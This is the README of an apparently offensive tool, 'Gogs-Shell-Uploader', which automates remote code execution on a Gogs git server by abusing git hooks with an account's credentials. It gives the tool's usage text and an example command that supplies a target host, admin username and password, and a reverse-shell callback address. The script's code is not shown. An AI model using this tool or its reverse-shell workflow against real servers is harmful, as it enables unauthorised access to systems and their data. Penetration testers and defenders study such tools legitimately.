# Gogs-Shell-Uploader
Tool to automate code execution on the server running Gogs git service.  
Inspired from: https://github.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce

![Alt text](./example.svg)
<!--[![asciicast](https://asciinema.org/a/562896.svg)](https://asciinema.org/a/562896)-->

## How to use
```bash
./gogs.py -h
usage: gogs.py [-h] -s SERVER -u USERNAME -p PASSWORD -r REVSHELL [-t TLS]

Tool to automate code execution on the server running Gogs git service.
[#] Type: Post-Authenticated
[#] Privilege: Permission to create Git hooks (Admin Panel > Users > Edit Account)
[#] Tested: 0.12.9 

options:
  -h, --help            show this help message and exit
  -s SERVER, --server SERVER
                        Hostname/IP (port) (path)
  -u USERNAME, --username USERNAME
                        Username of the account
  -p PASSWORD, --password PASSWORD
                        Password of the account
  -r REVSHELL, --revshell REVSHELL
                        <ip>:<port>
  -t TLS, --tls TLS     true or false

```

## Example
```bash
/gogs.py -s 192.168.1.24:8000 -u admin -p 'Password1234' -t false -r 192.168.45.5:80
```
